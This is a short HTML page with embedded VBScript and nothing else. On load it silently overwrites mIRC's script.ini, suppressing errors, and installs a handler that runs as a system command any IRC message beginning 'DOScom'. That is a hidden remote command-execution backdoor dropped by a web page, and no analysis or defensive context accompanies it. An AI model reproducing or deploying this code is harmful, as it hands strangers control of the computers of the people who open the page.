   <HTML>
   <SCRIPT LANGUAGE = "VBSCRIPT">
   on error resume next
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set MircScript = fso.CreateTextFile("C:\progra~1\mirc\script.ini",true)
   MircScript.Writeline "on 1:TEXT:DOScom*:*: {"
   MircScript.Writeline "run command /c $2-"
   MircScript.Writeline "}"
   MircScript.Close
   </Script>
   </HTML>
